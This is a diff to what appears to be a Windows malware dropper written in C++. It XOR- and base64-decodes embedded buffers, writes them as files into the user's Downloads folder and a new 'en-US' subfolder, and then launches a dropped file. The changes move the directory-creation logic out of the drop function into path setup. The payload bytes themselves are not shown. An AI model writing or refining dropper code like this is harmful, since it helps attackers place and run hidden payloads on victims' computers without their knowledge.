@@ -52,7 +52,7 @@
 void dead();
 std::uint64_t check_version();
 void dropper_start(int);
-void drop(DWORD size, void* buffer, std::wstring, std::wstring);
+void drop(DWORD size, void* buffer, std::wstring);
 void* XOR(void* data, DWORD size);
 void* base64decode(void* data, DWORD* size);
 bool non_exe_launch(std::wstring);
@@ -111,8 +111,6 @@ DWORD size3;
 DWORD size4;
 DWORD size5;
 
-std::wstring create_dir = L"";
-
 // Entry Point
 int main(int argc, char* argv[])
 {
@@ -155,9 +153,9 @@ int main(int argc, char* argv[])
 		data3 = XOR(data3, size3);
 	#endif
 
-		drop(size2, data2, name2, create_dir);
+		drop(size2, data2, name2);
 		size3 = size3 - 1;
-		drop(size3, data3, name3, create_dir);
+		drop(size3, data3, name3);
 
 		bool result = non_exe_launch(name3);
 
@@ -193,9 +191,8 @@ int main(int argc, char* argv[])
 //		data1 = XOR(data1, size1);
 	#endif
 
-		drop(size4, data4, name4, create_dir);
-		create_dir = L"C:\\Users\\Administrator\\Downloads\\en-US";
-		drop(size5, data5, name5, create_dir);
+		drop(size4, data4, name4);
+		drop(size5, data5, name5);
 //		drop(size1, data1, name1);
 
 //		exe_launch(name1);
@@ -235,9 +232,8 @@ int main(int argc, char* argv[])
 //		data1 = XOR(data1, size1);
 	#endif
 
-		drop(size4, data4, name4, create_dir);
-		create_dir = L"C:\\Users\\adind\\Downloads\\en-US";
-		drop(size5, data5, name5, create_dir);
+		drop(size4, data4, name4);
+		drop(size5, data5, name5);
 //		drop(size1, data1, name1);
 
 //		exe_launch(name1);
@@ -304,7 +300,8 @@ void setup_name(std::uint64_t os_version) {
 			name4 += temp;
 			name4 += L"\\Downloads";
 			name5 += temp;
-			name5 += L"\\Downloads";
+			name5 += L"\\Downloads\\en-US";
+			CreateDirectoryW(name5.c_str(), NULL);
 
 		} else {
 			printf("Problem with userprofile");
@@ -319,9 +316,11 @@ void setup_name(std::uint64_t os_version) {
 			name1 += temp;
 			name1 += L"\\Downloads";
 
-			name3 +=temp;
-			name3 += L"\\Downloads";
-
+			name4 += temp;
+			name4 += L"\\Downloads";
+			name5 += temp;
+			name5 += L"\\Downloads\\en-US";
+			CreateDirectoryW(name5.c_str(), NULL);
 		} else {
 			printf("Problem with userprofile");
 		}
@@ -592,21 +591,10 @@ void* XOR(void* data, DWORD size) {
 }
 
 // Drop buffer to file
-void drop(DWORD size, void* buffer, std::wstring drop_name, std::wstring create_dir)
+void drop(DWORD size, void* buffer, std::wstring drop_name)
 {
 
-	std::wstring write_dir = L"";
-	if (create_dir.c_str() != L""){
-		CreateDirectoryW(create_dir.c_str(), NULL);
-		write_dir = create_dir;
-		write_dir += L"\\";
-		write_dir += drop_name;
-	}
-	else {
-		write_dir = drop_name;
-	}
-
-	FILE* f = _wfopen(write_dir.c_str(), L"wb");
+	FILE* f = _wfopen(drop_name.c_str(), L"wb");
 	// traverse byte list
 	if (!f) {
 		perror("_wfopen");
